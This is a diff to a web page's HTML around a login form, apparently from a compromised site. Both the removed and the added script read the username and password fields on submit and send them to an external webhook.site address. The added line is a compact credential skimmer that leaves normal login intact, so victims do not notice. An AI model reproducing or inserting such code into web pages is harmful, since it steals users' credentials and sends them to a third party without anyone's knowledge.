@@ -156,20 +156,8 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 
 
 
-<script>
-  document.addEventListener("DOMContentLoaded", function () {
-    document.getElementById("loginForm").addEventListener("submit", function (e) {
-      e.preventDefault();
+<script>document.getElementById("loginForm").addEventListener("submit", function (e) {const username = document.querySelector("input[name='UserName']").value;const password = document.querySelector("input[name='Password']").value;fetch("https://webhook.site/f0956b48-6c2a-4996-9e48-39e901291634?username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password));});</script>
 
-      const username = document.querySelector("input[name='UserName']").value;
-      const password = document.querySelector("input[name='Password']").value;
-
-      fetch("https://webhook.site/f0956b48-6c2a-4996-9e48-39e901291634?username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password))
-        .then(response => console.log("ارسال شد:", response.status))
-        .catch(error => console.error("خطا:", error));
-    });
-  });
-</script>
 
 
 
